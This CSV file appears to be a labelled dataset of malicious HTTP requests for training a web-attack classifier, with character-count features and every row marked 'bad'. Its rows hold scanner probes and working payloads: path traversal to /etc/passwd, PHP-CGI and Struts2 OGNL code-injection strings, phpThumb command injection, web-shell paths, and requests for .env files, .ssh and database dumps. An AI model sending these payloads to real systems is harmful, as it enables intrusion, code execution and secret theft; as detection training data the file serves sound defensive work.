method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class 
GET,/login.jsprJM57,,0,0,0,0,0,0,bad
GET,/.env.local,,0,0,0,0,0,0,bad
GET,/c99shell.php,,0,0,0,0,0,0,bad
GET,/crm,,0,0,0,0,0,0,bad
GET,/opennms/login.jsp,,0,0,0,0,0,0,bad
GET,/rockmongo/,,0,0,0,0,0,0,bad
GET,/manager/html/,,0,0,0,0,0,0,bad
GET,/axis2/axis2-admin/,,0,0,0,0,0,0,bad
GET,/axis2/axis2-admin/welcome,,0,0,0,0,0,0,bad
GET,/login.php,,0,0,0,0,0,0,bad
GET,/index.asp,,0,0,0,0,0,0,bad
GET,/history/historyFrame.html,,0,0,0,0,0,0,bad
GET,/recover.jsp,,0,0,0,0,0,0,bad
GET,/pma/,,0,0,0,0,0,0,bad
GET,/members.mdb,,0,0,0,0,0,0,bad
GET,/README,,0,0,0,0,0,0,bad
GET,/hFemvMiW,,0,0,0,0,0,0,bad
GET,/Estadisticas/,,0,0,0,0,0,0,bad
GET,/api/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/nagios/,,0,0,0,0,0,0,bad
GET,/index.html,,0,0,0,0,0,0,bad
GET,/console/,,0,0,0,0,0,0,bad
GET,/system/console,,0,0,0,0,0,1,bad
GET,/nbproject,,0,0,0,0,0,0,bad
GET,/server/TCPIPGEN.htm,,0,0,0,0,0,0,bad
GET,/login.jsp::%24DATA,,0,0,0,0,0,0,bad
GET,/login.jsp/951743%40,,0,0,0,0,0,0,bad
GET,/home,,0,0,0,0,0,0,bad
GET,/WEB-INF/jboss-web.xml~,,0,0,0,0,0,0,bad
GET,/demo.testfire.net_db.sql,,0,0,0,0,0,0,bad
GET,/HTTPClntSend,,0,0,0,0,0,0,bad
GET,/mysql/,,0,0,0,0,0,0,bad
GET,/extrahop/,,0,0,0,0,0,0,bad
GET,/passwords.sqlite,,0,0,0,0,0,0,bad
GET,/admin/,,0,0,0,0,0,0,bad
GET,/c99.php,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/webtools/,,0,0,0,0,0,0,bad
GET,/applet.html,,0,0,0,0,0,0,bad
GET,/recentservers.xml,,0,0,0,0,0,0,bad
GET,/_private,,0,0,0,0,0,0,bad
GET,/login,,0,0,0,0,0,0,bad
GET,/jQuery-File-Upload/server/php/,,0,0,0,0,0,0,bad
GET,//JGXMWXYv.php,,0,0,0,0,0,0,bad
GET,/login.jsp?923825%40,,0,0,0,0,0,0,bad
GET,/readme.txt,,0,0,0,0,0,0,bad
GET,/.env.stage,,0,0,0,0,0,0,bad
GET,/host-manager/html/,,0,0,0,0,0,0,bad
GET,/LogfileSearch,,0,0,0,0,0,0,bad
GET,/otrs/,,0,0,0,0,0,0,bad
GET,/GruntFile.coffee,,0,0,0,0,0,0,bad
GET,/login.jsp?id=JJJ0QQQ&action=JJJ1QQQ&page=JJJ2QQQ&name=JJJ3QQQ&f=JJJ4QQQ&url=JJJ5QQQ&email=JJJ6QQQ&type=JJJ7QQQ&file=JJJ8QQQ&title=JJJ9QQQ&code=JJJ10QQQ&q=JJJ11QQQ&user=JJJ12QQQ&token=JJJ13QQQ&t=JJJ14QQQ&c=JJJ15QQQ&data=JJJ16QQQ&mode=JJJ17QQQ&order=JJJ18QQQ&lang=JJJ19QQQ&p=JJJ20QQQ&key=JJJ21QQQ&status=JJJ22QQQ&start=JJJ23QQQ&charset=JJJ24QQQ&s=JJJ25QQQ&post=JJJ26QQQ&login=JJJ27QQQ&search=JJJ28QQQ&content=JJJ29QQQ&comment=JJJ30QQQ&step=JJJ31QQQ&ajax=JJJ32QQQ&debug=JJJ33QQQ&state=JJJ34QQQ&query=JJJ35QQQ&error=JJJ36QQQ&save=JJJ37QQQ&sort=JJJ38QQQ&format=JJJ39QQQ&tab=JJJ40QQQ&offset=JJJ41QQQ&edit=JJJ42QQQ&preview=JJJ43QQQ&filter=JJJ44QQQ&from=JJJ45QQQ&view=JJJ46QQQ&a=JJJ47QQQ&limit=JJJ48QQQ&do=JJJ49QQQ&plugin=JJJ50QQQ&theme=JJJ51QQQ&text=JJJ52QQQ&test=JJJ53QQQ&path=JJJ54QQQ&pass=JJJ55QQQ&dir=JJJ56QQQ&show=JJJ57QQQ&h=JJJ58QQQ&value=JJJ59QQQ&filename=JJJ60QQQ&redirect=JJJ61QQQ&year=JJJ62QQQ&group=JJJ63QQQ&template=JJJ64QQQ&subject=JJJ65QQQ&m=JJJ66QQQ&u=JJJ67QQQ&dest=JJJ68QQQ&uri=JJJ69QQQ&continue=JJJ70QQQ&window=JJJ71QQQ&next=JJJ72QQQ&reference=JJJ73QQQ&site=JJJ74QQQ&&210Wo=JJJ75QQQ&,,0,0,0,0,0,0,bad
GET,/nstview.php,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/AVideo/install/index.php,,0,0,0,0,0,0,bad
GET,/join.jsp,,0,0,0,0,0,0,bad
GET,/contrib/extjs//examples/feed-viewer/feed-proxy.php?feed=http://bxss.me/t/fit.txt,,0,0,0,0,0,0,bad
GET,/s0GL2login.jsp,,0,0,0,0,0,0,bad
GET,/ckeditor,,0,0,0,0,0,0,bad
GET,/db.sql.gz,,0,0,0,0,0,0,bad
GET,/reports/Webalizer/,,0,0,0,0,0,0,bad
GET,/login.html,,0,0,0,0,0,0,bad
GET,/pi.php5,,0,0,0,0,0,0,bad
GET,/login.jsp,,0,0,0,0,0,0,bad
GET,/.env.test,,0,0,0,0,0,0,bad
GET,/host-manager/text/,,0,0,0,0,0,0,bad
GET,/cacti/,,0,0,0,0,0,0,bad
GET,/WEB-INF/jboss-web.xml_,,0,0,0,0,0,0,bad
GET,/min/index.php?f=/min/config.php%00.css,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/wp-content/themes/twentyfifteen/genericons/example.html,,0,0,0,0,0,0,bad
GET,/jQuery-File-Upload/php/,,0,0,0,0,0,0,bad
GET,/db/,,0,0,0,0,0,0,bad
GET,/manager/status/,,0,0,0,0,0,0,bad
GET,/login.bak,,0,0,0,0,0,0,bad
GET,/lc/system/console,,0,0,0,0,0,1,bad
GET,/create.sql.gz,,0,0,0,0,0,0,bad
GET,/controllers/application_controller.rb,,0,0,0,0,0,0,bad
GET,/php.php,,0,0,0,0,0,0,bad
GET,/login.jsp,,0,0,0,0,0,0,bad
GET,/nst.php,,0,0,0,0,0,0,bad
GET,/tomcat/host-manager/html/,,0,0,0,0,0,0,bad
GET,/ui/authentication/,,0,0,0,0,0,0,bad
GET,/README.txt,,0,0,0,0,0,0,bad
GET,/admin/ckeditor,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/wp-content/plugins/jetpack/_inc/genericons/genericons/example.html,,0,0,0,0,0,0,bad
GET,/signup.html,,0,0,0,0,0,0,bad
GET,/dbadmin/,,0,0,0,0,0,0,bad
GET,/test.mdb,,0,0,0,0,0,0,bad
GET,/login.jsp.bak,,0,0,0,0,0,0,bad
GET,/dump.sql.gz,,0,0,0,0,0,0,bad
GET,/YouPHPTube/install/index.php,,0,0,0,0,0,0,bad
GET,/extjs//examples/feed-viewer/feed-proxy.php?feed=http://bxss.me/t/fit.txt,,0,0,0,0,0,0,bad
GET,/login.jsp,,0,0,0,0,0,0,bad
GET,/jquery-file-upload/server/php/,,0,0,0,0,0,0,bad
GET,/scripts/history/historyFrame.html,,0,0,0,0,0,0,bad
GET,/LogfileTail,,0,0,0,0,0,0,bad
GET,/tomcat/manager/html/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/.env.prod.local,,0,0,0,0,0,0,bad
GET,/signup.cgi,,0,0,0,0,0,0,bad
GET,//db.php,,0,0,0,0,0,0,bad
GET,"/login.jsp""922515%40",,0,1,0,0,0,0,bad
GET,/i.php,,0,0,0,0,0,0,bad
GET,/tomcat/host-manager/text/,,0,0,0,0,0,0,bad
GET,/webalizer/,,0,0,0,0,0,0,bad
GET,/zabbix/,,0,0,0,0,0,0,bad
POST,/includes/ofc/php/ofc_upload_image.php?name=testing_test,testing test,0,0,0,0,1,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/Login.jsp,,0,0,0,0,0,0,bad
GET,/mysqladmin/,,0,0,0,0,0,0,bad
GET,/WEB-INF/jboss-web.xml.bak,,0,0,0,0,0,0,bad
GET,/rst.php,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/dbdump.sql.gz,,0,0,0,0,0,0,bad
GET,//db.inc,,0,0,0,0,0,0,bad
GET,/Rakefile,,0,0,0,0,0,0,bad
GET,/Readme.txt,,0,0,0,0,0,0,bad
GET,/login.jsp,,0,0,0,0,0,0,bad
GET,/app.rb,,0,0,0,0,0,0,bad
GET,/contao-manager.phar.php,,0,0,0,0,0,0,bad
GET,/minify/min/index.php?f=/minify/min/config.php%00.css,,0,0,0,0,0,0,bad
GET,/database.mdb,,0,0,0,0,0,0,bad
GET,/signup.php,,0,0,0,0,0,0,bad
GET,/PMA/,,0,0,0,0,0,0,bad
GET,/js/extjs//examples/feed-viewer/feed-proxy.php?feed=http://bxss.me/t/fit.txt,,0,0,0,0,0,0,bad
GET,/test.php,,0,0,0,0,0,0,bad
GET,/r57eng.php,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/Flex/history/historyFrame.html,,0,0,0,0,0,0,bad
GET,/tomcat/manager/status/,,0,0,0,0,0,0,bad
GET,/README.TXT,,0,0,0,0,0,0,bad
GET,/.env.production.local,,0,0,0,0,0,0,bad
GET,/login.bac,,0,0,0,0,0,0,bad
GET,/login.jsp;917910%40,,0,0,0,0,0,0,bad
GET,//////////////////../../../../../../../../etc/passwd,,0,0,0,0,0,0,bad
GET,/login.jspwp-content/themes/twentyfifteen/genericons/example.html,,0,0,0,0,0,0,bad
GET,/signup.asp,,0,0,0,0,0,0,bad
GET,/Webalizer/,,0,0,0,0,0,0,bad
GET,/Dockerfile,,0,0,0,0,0,0,bad
GET,/shell.php,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/cms/plugins/content/jthumbs/includes/phpThumb.php?src=./index.php&fltr[]=blur|5;echo+082119f75623eb7abd7bf357698ff66c>cache/testing;,,0,0,0,0,1,0,bad
GET,/MANIFEST.MF,,0,0,0,0,0,0,bad
GET,/ZlSfmYDz,,0,0,0,0,0,0,bad
GET,/cognos_express/manager/html/,,0,0,0,0,0,0,bad
GET,/.env.dev.local,,0,0,0,0,0,0,bad
GET,/database.sql.gz,,0,0,0,0,0,0,bad
GET,//conf.php,,0,0,0,0,0,0,bad
GET,/myadmin/,,0,0,0,0,0,0,bad
GET,/../../../../../../../../etc/passwd,,0,0,0,0,0,0,bad
GET,/usagedata/,,0,0,0,0,0,0,bad
POST,/login.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,<?php echo(md5('testing-php-cgi-rce')); ?>,2,0,0,2,5,0,bad
GET,/setup/index.php?s=set,,0,0,0,0,0,0,bad
GET,/.ssh,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/login.jsp.bac,,0,0,0,0,0,0,bad
GET,/personal.sqlite,,0,0,0,0,0,0,bad
GET,/login.jsp?id=950864%40,,0,0,0,0,0,0,bad
POST,/html/includes/ofc/php/ofc_upload_image.php?name=testing_test,testing test,0,0,0,0,1,0,bad
GET,/login.jspwp-content/plugins/jetpack/_inc/genericons/genericons/example.html,,0,0,0,0,0,0,bad
GET,/backup.sql.gz,,0,0,0,0,0,0,bad
GET,/phpmyadmin2/,,0,0,0,0,0,0,bad
GET,/log.mdb,,0,0,0,0,0,0,bad
GET,/readme.md,,0,0,0,0,0,0,bad
GET,//..//..//..//..//..//..//..//..//..//..//../etc/passwd,,0,0,0,0,0,0,bad
GET,/lib/js/extjs//examples/feed-viewer/feed-proxy.php?feed=http://bxss.me/t/fit.txt,,0,0,0,0,0,0,bad
GET,/bin,,0,0,0,0,0,0,bad
GET,/signup.aspx,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/LOGIN.JSP,,0,0,0,0,0,0,bad
GET,/login.jsp_bak,,0,0,0,0,0,0,bad
POST,/core/lib/php-ofc-library/ofc_upload_image.php?name=testing_test,testing test,0,0,0,0,1,0,bad
GET,/login.jsp?class.classLoader.resources.dirContext.aliases=/dqTxc4ig%3Dconf/,,0,0,0,0,0,0,bad
GET,/common/scripts/phpThumb/phpThumb.php?src=./index.php&fltr[]=blur|5;echo+082119f75623eb7abd7bf357698ff66c>cache/testing;,,0,0,0,0,1,0,bad
POST,/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,<?php echo(md5('testing-php-cgi-rce')); ?>,2,0,0,2,5,0,bad
GET,/admin/db.sql.gz,,0,0,0,0,0,0,bad
GET,/.env.development.local,,0,0,0,0,0,0,bad
GET,/WEB-INF/jboss-web.xml%20(copy),,0,0,0,1,1,0,bad
GET,//conf.inc,,0,0,0,0,0,0,bad
GET,/server/php/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/FCKeditor,,0,0,0,0,0,0,bad
GET,/login.jsp_,,0,0,0,0,0,0,bad
GET,/installation/index.php,,0,0,0,0,0,0,bad
GET,/install.jsp,,0,0,0,0,0,0,bad
POST,/libs/open-flash-chart/php-ofc-library/ofc_upload_image.php?name=testing_test,testing test,0,0,0,0,1,0,bad
GET,/login.jsp?class['classLoader']['resources']['dirContext']['aliases']=/MGtKd7zI%3Dconf/,,8,0,0,0,0,0,bad
GET,/admin/create.sql.gz,,0,0,0,0,0,0,bad
GET,/dra.php,,0,0,0,0,0,0,bad
GET,/logs/,,0,0,0,0,0,0,bad
GET,/.env.test.local,,0,0,0,0,0,0,bad
GET,/logs.mdb,,0,0,0,0,0,0,bad
GET,/../../../../../../../../windows/win.ini,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/fckeditor,,0,0,0,0,0,0,bad
GET,/signup.jsp,,0,0,0,0,0,0,bad
GET,/functions.jsp,,0,0,0,0,0,0,bad
POST,/application/libraries/ofc-library/ofc_upload_image.php?name=testing_test,testing test,0,0,0,0,1,0,bad
GET,/phpMyAdmin2/,,0,0,0,0,0,0,bad
GET,/login.jsp/MGtKd7zI/server.xml,,0,0,0,0,0,0,bad
GET,/phpThumb/phpThumb.php?src=./index.php&fltr[]=blur|5;echo+082119f75623eb7abd7bf357698ff66c>cache/testing;,,0,0,0,0,1,0,bad
GET,/_webalizer/,,0,0,0,0,0,0,bad
GET,/.env.save,,0,0,0,0,0,0,bad
GET,/data.mdb,,0,0,0,0,0,0,bad
GET,/README.htm,,0,0,0,0,0,0,bad
GET,//settings.php,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/temp.php,,0,0,0,0,0,0,bad
GET,/config.ru,,0,0,0,0,0,0,bad
GET,/login.jsp/dqTxc4ig/server.xml,,0,0,0,0,0,0,bad
GET,/customers.sqlite,,0,0,0,0,0,0,bad
GET,/bak.login.jsp,,0,0,0,0,0,0,bad
GET,/phpsysinfo,,0,0,0,0,0,0,bad
GET,/admin/pma/,,0,0,0,0,0,0,bad
GET,/WEB-INF/jboss-web.xml%20-%20Copy,,0,0,0,0,2,0,bad
GET,/.env.live,,0,0,0,0,0,0,bad
GET,/login.jsp?debug=xml,,0,0,0,0,0,0,bad
GET,/db.mdb,,0,0,0,0,0,0,bad
GET,/Register,,0,0,0,0,0,0,bad
GET,//settings.inc,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/j2/installation/index.php,,0,0,0,0,0,0,bad
GET,"/login.jsp?debug=command&expression=%23_memberAccess[""allowStaticMethodAccess""]=true,@java.lang.Runtime@getRuntime()",,0,2,0,1,0,0,bad
GET,/login.jsp?aaa=1${,,0,0,0,0,0,0,bad
GET,/libs/phpThumb/phpThumb.php?src=./index.php&fltr[]=blur|5;echo+082119f75623eb7abd7bf357698ff66c>cache/testing;,,0,0,0,0,1,0,bad
GET,/admin/dump.sql.gz,,0,0,0,0,0,0,bad
GET,/phpldapadmin,,0,0,0,0,0,0,bad
POST,/piwik/libs/open-flash-chart/php-ofc-library/ofc_upload_image.php?name=testing_test,testing test,0,0,0,0,1,0,bad
GET,/WEB-INF/Copy%20of%20jboss-web.xml,,0,0,0,0,2,0,bad
GET,/config.rb,,0,0,0,0,0,0,bad
GET,/db1.mdb,,0,0,0,0,0,0,bad
GET,/register,,0,0,0,0,0,0,bad
GET,/CFIDE/scripts/ajax/FCKeditor,,0,0,0,0,0,0,bad
GET,//config.php,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/installer/index.php,,0,0,0,0,0,0,bad
GET,/login.jsp?redirect:%25{333*444},,0,0,0,0,0,0,bad
GET,/META-INF,,0,0,0,0,0,0,bad
GET,/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,0,0,0,0,0,0,bad
GET,/uploadify,,0,0,0,0,0,0,bad
GET,/login.BAK,,0,0,0,0,0,0,bad
GET,/r.php,,0,0,0,0,0,0,bad
GET,/libs/js/extjs//examples/feed-viewer/feed-proxy.php?feed=http://bxss.me/t/fit.txt,,0,0,0,0,0,0,bad
GET,/.env.backup,,0,0,0,0,0,0,bad
GET,//config.inc,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/admin/dbdump.sql.gz,,0,0,0,0,0,0,bad
GET,/usage/,,0,0,0,0,0,0,bad
GET,/login.jsp?JSESSIONID=testingsessionfixation,,0,0,0,0,0,0,bad
GET,/login.jsp?redirectAction:http://static.bxss.me/,,0,0,0,0,0,0,bad
GET,/SimpappServlet,,0,0,0,0,0,0,bad
GET,/RegisterUser,,0,0,0,0,0,0,bad
GET,/info.php,,0,0,0,0,0,0,bad
GET,/gs/plugins/editors/fckeditor,,0,0,0,0,0,0,bad
GET,/login.jsp.BAK,,0,0,0,0,0,0,bad
GET,/members.sqlite,,0,0,0,0,0,0,bad
GET,/WEB-INF%20(copy)/jboss-web.xml,,0,0,0,1,1,0,bad
GET,/compass.rb,,0,0,0,0,0,0,bad
GET,//config.inc.php,,0,0,0,0,0,0,bad
GET,/login.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/.stats/,,0,0,0,0,0,0,bad
GET,/login.jsp?debug=console,,0,0,0,0,0,0,bad
GET,/login/%3f.jsp,,0,0,0,0,0,0,bad
GET,/index.php?r=installer/welcome,,0,0,0,0,0,0,bad
GET,/StockServlet,,0,0,0,0,0,0,bad
GET,/IgIUUp8Q,,0,0,0,0,0,0,bad
GET,/export.jsp,,0,0,0,0,0,0,bad
GET,/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini,,0,0,0,0,0,0,bad
GET,/test.sqlite,,0,0,0,0,0,0,bad
GET,/login.jsp;JSESSIONID=testingsessionfixation,,0,0,0,0,0,0,bad
GET,/Install.txt,,0,0,0,0,0,0,bad
GET,/include/js/extjs//examples/feed-viewer/feed-proxy.php?feed=http://bxss.me/t/fit.txt,,0,0,0,0,0,0,bad
POST,/scripts/openflashchart/open-flash-chart/php-ofc-library/ofc_upload_image.php?name=testing_test,testing test,0,0,0,0,1,0,bad
POST,/struts2-showcase/integration/saveGangster.action,age=1212&__checkbox_bustedBefore=true&description=123&name=${(#o=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#o):((#c=#context['com.opensymphony.xwork2.ActionContext.container']).(#g=#c.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#g.getExcludedPackageNames().clear()).(#g.getExcludedClasses().clear()).(#context.setMemberAccess(#o)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()).(#o.println(7326*5920)).(#o.flush())},2,0,0,22,0,0,bad
GET,/beheer/,,0,0,0,0,0,0,bad
GET,/login.JSP,,0,0,0,0,0,0,bad
GET,/limesurvey/index.php?r=installer/welcome,,0,0,0,0,0,0,bad
GET,/T3AdminMain,,0,0,0,0,0,0,bad
GET,/Vagrantfile,,0,0,0,0,0,0,bad
GET,//localconfig.php,,0,0,0,0,0,0,bad
GET,/.env.old,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/editors/FCKeditor,,0,0,0,0,0,0,bad
GET,/login.old,,0,0,0,0,0,0,bad
GET,/gallery/phpThumb/phpThumb.php?src=./index.php&fltr[]=blur|5;echo+082119f75623eb7abd7bf357698ff66c>cache/testing;,,0,0,0,0,1,0,bad
